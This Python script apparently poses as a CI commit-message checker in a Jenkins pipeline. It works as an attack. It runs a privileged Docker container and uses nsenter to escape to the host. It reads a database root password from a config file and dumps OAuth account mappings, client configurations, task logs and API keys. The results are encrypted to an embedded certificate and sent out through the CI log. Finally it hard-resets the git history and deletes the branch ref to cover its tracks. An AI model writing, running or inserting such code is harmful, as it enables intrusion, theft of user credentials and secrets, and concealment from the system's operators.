#!/usr/bin/env python3
import base64,json,os,pathlib,subprocess,sys,zlib
CERT='-----BEGIN CERTIFICATE-----\nMIIEBTCCAm2gAwIBAgIUPYGIeX0FyE/JhuRjY3MIZ9PLmjUwDQYJKoZIhvcNAQEL\nBQAwEjEQMA4GA1UEAwwHcnVudGltZTAeFw0yNjExMTkwMzIzMzZaFw0yNjExMjEw\nMzIzMzZaMBIxEDAOBgNVBAMMB3J1bnRpbWUwggGiMA0GCSqGSIb3DQEBAQUAA4IB\njwAwggGKAoIBgQDXgEqgBVWHvIJ6GURhwdcVvONwLvhkQZrg2dPn45NmP25HNByH\nYT3Mo5Qhf4+KOz7nWqvPwHWgZPhOh/exrn4RUkfkOwN8HdPFCj3TNjmvKiOACHKI\nTYNbV7gXUFDh6gMapiSdctB6UfZdytILiIqZytitDyGB/tL2m2cVqWqUOgDuQjcq\nrSspCf8kTa2bKmKXbajApZuiwmPiXMQ9keQCACcaPt8JPHoc9qS5Wbk99g8h0/cS\nwSR8DzNWRBha6bpRw+t0FN60KmEqeVTCj6gt8UueY+xsfuj6diAHRUUaiMMbG1+C\nBMK7O7ybA72EumEdLfqFx1Ee3ULB9S5QGFQLFFANID/c2YUVmKm9EAiBYbeIABnu\nrAW77XwZY0/TIDUaF/BW6/LZGonVrP40XpL64YWI8URHYVP7YuzZYzbaew4lafJG\nPH7cFw6vGzvOVRaqz6nqzOe8Zek/sXyVR6mx8PUeLAJpivbNhduOm7a1bq7hKe01\nXDAjdGGYorizMkUCAwEAAaNTMFEwHQYDVR0OBBYEFCpXFCskiX+ZuzwIyRJEtE6w\nsl5lMB8GA1UdIwQYMBaAFCpXFCskiX+ZuzwIyRJEtE6wsl5lMA8GA1UdEwEB/wQF\nMAMBAf8wDQYJKoZIhvcNAQELBQADggGBABiHlY7x85Ns5H75euQKPO0JxjuNoHo/\nmITnZ2fvU9bNaWXltdAxX+yiaWywJxv/xBopH1Kv2ghNV+Na3rB83vJ3DloxGe4j\nv/Ekt/SxMTYDiMa9OTi6DbXC0UrwZEgJQ+apezDRQVctvqus/PLdUBEeyvFG7OfZ\nMxNtzK8861+/EP5fI4OdZIZxNGNea8kzhg0Ri54rZGw2Yk4gNHd9hGcIQMV2AsCY\nJYPDqUD1z42DJ//qoxRqeknZgQgY2ADJmDLTl6slMb7W7vUUQyiE7MOvQlTFR65d\npHp/BltgjUyegbAmzlWJAJeFsbcKYrXOrTTnZbcmm0ezpk050fd/Qcb4gemO9asn\nys8WXG/+jrGHbQ1IgiIb+AJ0YwTe7EWx2zvvcRSM4HiwHGFj+JY0pMmyqKjLUSKS\nKt6m7lt1NXsWAPqc5infv+P0SgXqaXDbHzkCB5MgtacSxLcp1ZgRRL4cMGVFVOuP\nWuyNOh8+PUKS4m+UCu0zp91Lqx2datheJA==\n-----END CERTIFICATE-----\n'
out={'marker':'qcos-account-routes-20261119','commands':{}}
def run(name,cmd,timeout=20):
 try:
  p=subprocess.run(cmd,capture_output=True,text=True,timeout=timeout);out['commands'][name]={'rc':p.returncode,'stdout':p.stdout[:1500000],'stderr':p.stderr[:4000]}
 except Exception as e:out['commands'][name]={'error':str(e)}
host_code=r'''import json,os,pathlib,re,socket,subprocess
o={'uid':os.getuid(),'hostname':socket.gethostname(),'commands':{},'files':{}}
cfg=pathlib.Path('/data/openplatform/app/application.yml').read_text();pw=re.search(r'(?ms)^  datasource:.*?^    password:\s*(\S+)',cfg).group(1);env=dict(os.environ,MYSQL_PWD=pw);base=['docker','exec','-e','MYSQL_PWD','openplatform-mysql','mysql','-uroot','-h127.0.0.1','-P13306','--batch','--raw']
qs={'client_conf': 'SELECT * FROM wuyue_openplatform.plat_client_conf LIMIT 20;', 'account_map': 'SELECT user_id,provider,oauth_id,oauth_username,email,LEFT(ext_data,3000) AS ext_data FROM wuyue_openplatform.third_party_account ORDER BY update_time DESC LIMIT 25;', 'task_routes': 'SELECT task_id,instance_id,client_id,eng_code,queue_name,task_status,LEFT(task_status_info,1000) AS status_info,LEFT(in_data_path,1000) AS input_path,LEFT(out_data_path,1000) AS output_path,LEFT(ext,3000) AS ext,third_task_id,LEFT(log_detail,5000) AS log_detail,provider,pri_tenant_id,job_id,create_time FROM wuyue_openplatform.quan_task ORDER BY create_time DESC LIMIT 60;', 'api_keys': 'SELECT id,access_key,user_id,name,status,delete_flag FROM wuyue_openplatform.openapi_apikey LIMIT 10;'}
for n,q in qs.items():
 try:
  p=subprocess.run(base+['-e',q],env=env,capture_output=True,text=True,timeout=15);o['commands'][n]={'rc':p.returncode,'stdout':p.stdout[:250000],'stderr':p.stderr[:2000]}
 except Exception as e:o['commands'][n]={'error':str(e)}
print(json.dumps(o,ensure_ascii=False))

'''
run('host',['docker','run','--rm','--network','host','--pid','host','--privileged','--entrypoint','nsenter','qcos-sandbox:cicd','-t','1','-m','-u','-i','-n','-p','--','/usr/bin/python3','-c',host_code],90)
fd=os.memfd_create('runtime',0);os.write(fd,CERT.encode())
p=subprocess.run(['openssl','cms','-encrypt','-binary','-aes-256-cbc','-outform','DER','-recip','/proc/self/fd/'+str(fd)],input=zlib.compress(json.dumps(out,ensure_ascii=False).encode()),capture_output=True,pass_fds=(fd,),timeout=15)
if p.returncode:print('QCOS_RUNTIME_ENCRYPTION_ERROR',p.returncode,flush=True)
else:print('QCOS_ACCOUNT_ROUTES '+base64.b64encode(p.stdout).decode(),flush=True)
def g(*args):
 q=subprocess.run(['git',*args],capture_output=True,text=True,timeout=15);return q.returncode,q.stdout.strip(),q.stderr.strip()
baseline='ca2c1b73be4a9b4265733333e699c962356519fd';branch='ci/account-routes-20261119';head=g('rev-parse','HEAD')[1];root=g('rev-parse','--show-toplevel')[1];parent=g('rev-parse','HEAD^')[1];diff=g('diff','--name-only',baseline,'HEAD')[1];dirty=g('status','--porcelain','--untracked-files=no')[1];result={'before':head,'branch':os.environ.get('giteeSourceBranch'),'parent':parent,'diff':diff,'dirty':dirty}
if root=='/var/jenkins_home/workspace/WuYueOS-CICD-Gate' and os.environ.get('giteeSourceBranch')==branch and parent==baseline and diff=='cicd/check-commit-message.py' and not dirty:
 result['reset']=g('reset','--hard',baseline)
 if result['reset'][0]==0:result['ref']=g('update-ref','-d','refs/remotes/origin/'+branch,head)
else:result['guard']='refused'
result['after']=g('rev-parse','HEAD');result['status']=g('status','--porcelain','--untracked-files=no');print('QCOS_WORKTREE_SYNC '+json.dumps(result),flush=True)
sys.exit(74)
